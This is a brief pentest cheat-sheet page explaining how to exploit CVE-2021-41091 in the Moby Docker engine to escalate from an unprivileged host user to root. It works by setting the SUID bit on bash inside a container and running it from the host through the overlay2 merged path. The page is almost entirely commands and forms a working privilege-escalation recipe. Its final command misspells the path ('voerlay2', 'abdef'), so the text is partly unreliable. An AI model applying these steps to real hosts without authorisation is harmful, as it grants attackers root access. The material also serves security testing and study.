# Moby Docker Engine Privilege Escalation

### Directory Traversal & Arbitrary Command Execution ([CVE-2021-41091](https://www.suse.com/security/cve/CVE-2021-41091.html) ) <a href="#directory-traversal-arbitrary-command-execution-cve-2021-41091" id="directory-traversal-arbitrary-command-execution-cve-2021-41091"></a>

#### 1. Find Docker Container Directory <a href="#id-1-find-docker-container-directory" id="id-1-find-docker-container-directory"></a>

First off, find the directory which the docker container mounted

```shellscript
findmnt

# Results e.g.
/var/lib/docker/overlay2/abcdef...xyz/merged
```

Assume the directory above found, we can investigate in the directory.

```shellscript
ls -la /var/lib/docker/overlay2/abcdef...xyz/merged/
```

#### 2. Prepare SUID Binary in Container <a href="#id-2-prepare-suid-binary-in-container" id="id-2-prepare-suid-binary-in-container"></a>

If we can be root in the docker container, set uid arbitrary binary as below. Please note that we need to do that in the container, not the real host.

```shellscript
chmod u+s /bin/bash
```

#### 3. Execute the SUID Binary in Real Host <a href="#id-3-execute-the-suid-binary-in-real-host" id="id-3-execute-the-suid-binary-in-real-host"></a>

Back to the real host machine again, execute the binary which we set uid to privilege escalation.

```shellscript
/var/lib/docker/voerlay2/abdef...xyz/merged/bin/bash -p
```

We should get a root shell.
